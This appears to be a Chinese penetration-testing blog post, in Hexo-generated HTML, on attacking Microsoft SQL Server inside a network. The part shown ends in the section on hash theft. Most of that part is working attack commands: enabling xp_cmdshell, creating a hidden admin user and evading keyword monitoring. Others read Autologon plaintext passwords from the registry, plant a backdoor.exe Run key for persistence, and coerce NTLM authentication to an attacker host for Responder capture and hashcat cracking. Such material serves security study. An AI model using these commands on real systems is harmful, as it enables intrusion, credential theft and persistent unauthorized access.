@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言Microsoft SQL Server（MSSQL）是内网渗透中极具价值的攻击目标。它不仅存储着业务敏感数据，更因其丰富的系统存储过程和扩展机制，成为攻击者横向移动、提权的重要跳板。本文系统梳理MSSQL数据库的攻击面，涵盖命令执行、注册表操作、文件系统探测、OLE自动化、链接服务器利用、UNC哈希窃取、PowerUpSQL模块及CLR程序集提权等核心技术。  免责声明： 本文所述技术仅供安">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSSQL数据库攻击面">
+<meta property="og:url" content="https://congliang.github.io/Intranet-MSSQL-attacks/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言Microsoft SQL Server（MSSQL）是内网渗透中极具价值的攻击目标。它不仅存储着业务敏感数据，更因其丰富的系统存储过程和扩展机制，成为攻击者横向移动、提权的重要跳板。本文系统梳理MSSQL数据库的攻击面，涵盖命令执行、注册表操作、文件系统探测、OLE自动化、链接服务器利用、UNC哈希窃取、PowerUpSQL模块及CLR程序集提权等核心技术。  免责声明： 本文所述技术仅供安">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-05T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.909Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="数据库安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Intranet-MSSQL-attacks/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Intranet-MSSQL-attacks/","path":"Intranet-MSSQL-attacks/","title":"MSSQL数据库攻击面"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>MSSQL数据库攻击面 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%85%B8%E5%9E%8B%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF"><span class="nav-number">2.</span> <span class="nav-text">一、典型攻击场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81xp-cmdshell-%E2%80%94%E2%80%94-%E7%BB%8F%E5%85%B8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.</span> <span class="nav-text">二、xp_cmdshell —— 经典命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81xp-regread-xp-regwrite-%E2%80%94%E2%80%94-%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%AF%BB%E5%86%99"><span class="nav-number">4.</span> <span class="nav-text">三、xp_regread &#x2F; xp_regwrite —— 注册表读写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E8%AF%BB%E5%8F%96%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BF%A1%E6%81%AF"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 读取注册表信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E5%86%99%E5%85%A5%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 写入注册表实现持久化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81xp-dirtree-%E2%80%94%E2%80%94-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B%E4%B8%8EUNC%E5%93%88%E5%B8%8C%E7%AA%83%E5%8F%96"><span class="nav-number">5.</span> <span class="nav-text">四、xp_dirtree —— 文件探测与UNC哈希窃取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8E%A2%E6%B5%8B"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 文件系统探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-UNC%E8%B7%AF%E5%BE%84%E5%93%88%E5%B8%8C%E7%AA%83%E5%8F%96"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 UNC路径哈希窃取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-NTLM%E4%B8%AD%E7%BB%A7"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 NTLM中继</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81SP-OACreate-%E4%B8%8E-OLE-%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-number">6.</span> <span class="nav-text">五、SP_OACreate 与 OLE 自动化过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%88Scripting-FileSystemObject%EF%BC%89"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 文件操作（Scripting.FileSystemObject）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88WScript-Shell%EF%BC%89"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 命令执行（WScript.Shell）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-HTTP%E5%A4%96%E4%BC%A0%EF%BC%88MSXML2-ServerXMLHTTP%EF%BC%89"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 HTTP外传（MSXML2.ServerXMLHTTP）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-WMI%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%88WbemScripting-SWbemLocator%EF%BC%89"><span class="nav-number">6.4.</span> <span class="nav-text">5.4 WMI横向移动（WbemScripting.SWbemLocator）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E9%93%BE%E6%8E%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88Linked-Server%EF%BC%89%E9%93%BE%E5%BC%8F%E6%94%BB%E5%87%BB"><span class="nav-number">7.</span> <span class="nav-text">六、链接服务器（Linked Server）链式攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E5%9C%A8%E9%93%BE%E6%8E%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 在链接服务器上执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E5%A4%9A%E7%BA%A7%E9%93%BE%E5%BC%8F%E8%B7%B3%E6%9D%BF"><span class="nav-number">7.3.</span> <span class="nav-text">6.3 多级链式跳板</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81PowerUpSQL-%E2%80%94%E2%80%94-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97"><span class="nav-number">8.</span> <span class="nav-text">七、PowerUpSQL —— 自动化攻击模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0"><span class="nav-number">8.1.</span> <span class="nav-text">7.1 实例发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%A9%E7%94%A8"><span class="nav-number">8.2.</span> <span class="nav-text">7.2 自动化利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81CLR%E7%A8%8B%E5%BA%8F%E9%9B%86%E6%8F%90%E6%9D%83%EF%BC%88%E7%AE%80%E8%BF%B0%EF%BC%89"><span class="nav-number">9.</span> <span class="nav-text">八、CLR程序集提权（简述）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94%E6%80%BB%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">九、技术对比总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">11.</span> <span class="nav-text">十、防御建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">12.</span> <span class="nav-text">结语</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Intranet-MSSQL-attacks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="MSSQL数据库攻击面 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MSSQL数据库攻击面
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-09-05 08:00:00" itemprop="dateCreated datePublished" datetime="2025-09-05T08:00:00+08:00">2025-09-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Microsoft SQL Server（MSSQL）是内网渗透中极具价值的攻击目标。它不仅存储着业务敏感数据，更因其丰富的系统存储过程和扩展机制，成为攻击者横向移动、提权的重要跳板。本文系统梳理MSSQL数据库的攻击面，涵盖命令执行、注册表操作、文件系统探测、OLE自动化、链接服务器利用、UNC哈希窃取、PowerUpSQL模块及CLR程序集提权等核心技术。</p>
+<blockquote>
+<p><strong>免责声明：</strong> 本文所述技术仅供安全研究与学习参考，请勿用于非法用途。因不当使用造成的任何法律后果，作者概不负责。</p>
+</blockquote>
+<h2 id="一、典型攻击场景"><a href="#一、典型攻击场景" class="headerlink" title="一、典型攻击场景"></a>一、典型攻击场景</h2><p>假设条件：攻击者已获取MSSQL连接凭证（SQL注入、弱口令爆破、配置文件泄露等途径）；目标为Windows Server，SQL Server以 <code>NT SERVICE\MSSQLSERVER</code> 或 <code>LocalSystem</code> 身份运行；内网中存在域控、文件服务器等主机。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用连接方式</span></span><br><span class="line">impacket-mssqlclient sa:Password123@192.168.1.100</span><br><span class="line">sqlcmd -S 192.168.1.100 -U sa -P Password123     <span class="comment"># Windows环境</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="二、xp-cmdshell-——-经典命令执行"><a href="#二、xp-cmdshell-——-经典命令执行" class="headerlink" title="二、xp_cmdshell —— 经典命令执行"></a>二、xp_cmdshell —— 经典命令执行</h2><p><code>xp_cmdshell</code> 以SQL Server服务账户权限在操作系统层执行任意命令。SQL Server 2005起默认禁用，需 <code>sysadmin</code> 角色启用。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 启用 xp_cmdshell</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>; RECONFIGURE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行系统命令</span></span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_cmdshell <span class="string">&#x27;ipconfig /all&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_cmdshell <span class="string">&#x27;net user hacker P@ssw0rd /add&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_cmdshell <span class="string">&#x27;net localgroup administrators hacker /add&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>若 <code>xp_cmdshell</code> 被删除（<code>sp_dropextendedproc</code>），可尝试重建：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_addextendedproc xp_cmdshell, <span class="string">&#x27;xplog70.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>绕过简单监控的一些手段：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通过 sp_executesql 间接调用</span></span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@cmd</span> NVARCHAR(<span class="number">4000</span>) <span class="operator">=</span> <span class="string">&#x27;EXEC xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_executesql <span class="variable">@cmd</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 变量拼接规避关键字匹配</span></span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@a</span> NVARCHAR(<span class="number">100</span>)<span class="operator">=</span><span class="string">&#x27;who&#x27;</span>,<span class="variable">@b</span> NVARCHAR(<span class="number">100</span>)<span class="operator">=</span><span class="string">&#x27;ami&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="variable">@a</span><span class="operator">+</span><span class="variable">@b</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、xp-regread-xp-regwrite-——-注册表读写"><a href="#三、xp-regread-xp-regwrite-——-注册表读写" class="headerlink" title="三、xp_regread &#x2F; xp_regwrite —— 注册表读写"></a>三、xp_regread &#x2F; xp_regwrite —— 注册表读写</h2><p>这两个扩展存储过程允许在SQL Server上下文中读写Windows注册表，能用于信息收集、凭证提取及持久化。</p>
+<h3 id="3-1-读取注册表信息"><a href="#3-1-读取注册表信息" class="headerlink" title="3.1 读取注册表信息"></a>3.1 读取注册表信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 读取 LSA 配置</span></span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_regread N<span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,</span><br><span class="line">    N<span class="string">&#x27;SYSTEM\CurrentControlSet\Control\Lsa&#x27;</span>, N<span class="string">&#x27;LSA&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 读取 RDP 端口号</span></span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_regread N<span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,</span><br><span class="line">    N<span class="string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#x27;</span>,</span><br><span class="line">    N<span class="string">&#x27;PortNumber&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 提取 Autologon 明文凭据</span></span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_regread N<span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,</span><br><span class="line">    N<span class="string">&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#x27;</span>,</span><br><span class="line">    N<span class="string">&#x27;DefaultPassword&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-写入注册表实现持久化"><a href="#3-2-写入注册表实现持久化" class="headerlink" title="3.2 写入注册表实现持久化"></a>3.2 写入注册表实现持久化</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 启用远程桌面</span></span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_regwrite N<span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,</span><br><span class="line">    N<span class="string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span>,</span><br><span class="line">    N<span class="string">&#x27;fDenyTSConnections&#x27;</span>, N<span class="string">&#x27;REG_DWORD&#x27;</span>, <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注册启动项</span></span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_regwrite N<span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,</span><br><span class="line">    N<span class="string">&#x27;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#x27;</span>,</span><br><span class="line">    N<span class="string">&#x27;SQLService&#x27;</span>, N<span class="string">&#x27;REG_SZ&#x27;</span>, <span class="string">&#x27;C:\windows\temp\backdoor.exe&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：两者均需 <code>sysadmin</code> 角色或对目标注册表项的具体访问权。</p>
+</blockquote>
+<h2 id="四、xp-dirtree-——-文件探测与UNC哈希窃取"><a href="#四、xp-dirtree-——-文件探测与UNC哈希窃取" class="headerlink" title="四、xp_dirtree —— 文件探测与UNC哈希窃取"></a>四、xp_dirtree —— 文件探测与UNC哈希窃取</h2><p><code>xp_dirtree</code> 用于列出目录内容，仅需 <code>public</code> 权限即可执行。当参数为UNC路径时，SQL Server将通过SMB协议连接远程主机并发起NTLM认证——攻击者可借此捕获Net-NTLM哈希。</p>
+<h3 id="4-1-文件系统探测"><a href="#4-1-文件系统探测" class="headerlink" title="4.1 文件系统探测"></a>4.1 文件系统探测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 列出目录结构</span></span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_dirtree <span class="string">&#x27;C:\&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>;</span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_dirtree <span class="string">&#x27;C:\Users\Administrator\Desktop&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 搜索特定文件（配合临时表）</span></span><br><span class="line"><span class="keyword">CREATE TABLE</span> #tmp (sub NVARCHAR(<span class="number">512</span>), depth <span class="type">INT</span>, isf <span class="type">INT</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> #tmp <span class="keyword">EXEC</span> master.dbo.xp_dirtree <span class="string">&#x27;C:\inetpub\wwwroot&#x27;</span>, <span class="number">2</span>, <span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> #tmp <span class="keyword">WHERE</span> sub <span class="keyword">LIKE</span> <span class="string">&#x27;%.aspx&#x27;</span>; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> #tmp;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-UNC路径哈希窃取"><a href="#4-2-UNC路径哈希窃取" class="headerlink" title="4.2 UNC路径哈希窃取"></a>4.2 UNC路径哈希窃取</h3><p>这是横向移动中的关键技巧。攻击者启动SMB监听或Responder，诱使SQL Server访问UNC路径：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 三种触发UNC访问的方法</span></span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_dirtree <span class="string">&#x27;\\192.168.1.50\share&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>;</span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_fileexist <span class="string">&#x27;\\192.168.1.50\share\foo.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_subdirs <span class="string">&#x27;\\192.168.1.50\share&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者侧：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> responder -I eth0 -v                        <span class="comment"># 监听SMB请求</span></span><br><span class="line">impacket-smbserver -smb2support share /tmp/share <span class="comment"># 或使用impacket</span></span><br><span class="line">hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt  <span class="comment"># 破解哈希</span></span><br></pre></td></tr></table></figure>
+
